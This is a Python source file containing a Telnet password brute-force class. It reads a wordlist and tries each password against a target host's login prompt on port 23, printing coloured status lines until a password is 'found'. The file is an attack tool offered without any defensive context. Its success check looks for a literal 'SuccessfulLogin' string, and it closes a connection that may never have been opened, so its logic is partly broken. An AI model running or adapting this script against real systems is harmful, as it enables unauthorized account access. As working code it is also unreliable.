from telnetlib import Telnet
from datetime import datetime

class TELNET_BRUTEFORCE:
    def __init__(self, target: str, username: str, timeout: int, wordlist: str) -> None:
        self.timeout = timeout
        self.username = username
        self.wordlist = wordlist
        self.host = target

    def connection_status(self, password: str) -> bool:
        status = False  
        try:
            telnet_client = Telnet(host=self.host, timeout=self.timeout, port=23)
            telnet_client.read_until(b"login:", timeout=self.timeout)
            telnet_client.write(self.username.encode('ascii') + b"\n")
            telnet_client.read_until(b"Password:", timeout=self.timeout)
            telnet_client.write(password.encode('ascii') + b"\n")
            result = telnet_client.read_until(b"prompt", timeout=self.timeout)
            
            if b"SuccessfulLogin" in result:
                status = True
        
        except Exception:
            status = False
        
        telnet_client.close()
        
        return status
    
        
    def start(self):
        try:
            with open(self.wordlist, "r") as file:
                for line in file.readlines():
                    password = line.strip()
                    try:
                        connection_status = self.connection_status(password=password)
                        if connection_status:
                            print(f"{'=' * 25}|Status|{'=' * 25}\n\n[{datetime.utcnow()}]\033[32m PASSWORD FOUND !!\033[0m\n\n[Password --> ({password})]\n\n")  
                            break
                        
                        else:
                            print(f"{'=' * 25}|Status|{'=' * 25}\n\n[{datetime.utcnow()}]\033[31m Not Found\033[0m\n\n[Current Password --> ({password})]\n\n")
                    
                    except Exception as e:
                        print(str(e))
                
                print(f"{'=' * 25}|Status|{'=' * 25}\n\n[{datetime.utcnow()}]\033[33m WordList Finished\033[0m\n\n[Current Password --> (None)]\n\n")
        
        except FileNotFoundError:
            print("File Not Found")